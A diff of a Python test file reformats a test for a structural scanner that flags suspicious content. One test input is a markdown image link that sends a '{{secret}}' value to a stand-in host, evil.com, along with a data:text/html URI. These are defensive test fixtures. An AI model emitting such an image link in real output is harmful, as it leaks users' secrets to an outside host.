@@ -289,17 +289,16 @@ class TestMixedContent:
 
     def test_multiple_suspicious_penalty(self) -> None:
         """Multiple SUSPICIOUS flags accumulate penalty."""
-        text = (
-            "![img](https://evil.com/log?d={{secret}})\n"
-            "data:text/html,payload\n"
-        )
+        text = "![img](https://evil.com/log?d={{secret}})\ndata:text/html,payload\n"
         result = scan_structural(text)
         assert result.verdict == Stage2Verdict.SUSPICIOUS
         # 2 suspicious flags => -0.30
         suspicious_count = len(result.flags)
         assert suspicious_count >= 2
-        assert result.penalty == pytest.approx(-0.15 * suspicious_count) or \
-            result.penalty >= -0.45
+        assert (
+            result.penalty == pytest.approx(-0.15 * suspicious_count)
+            or result.penalty >= -0.45
+        )
 
     def test_penalty_cap(self) -> None:
         """Penalty should cap at -0.45 regardless of flag count."""
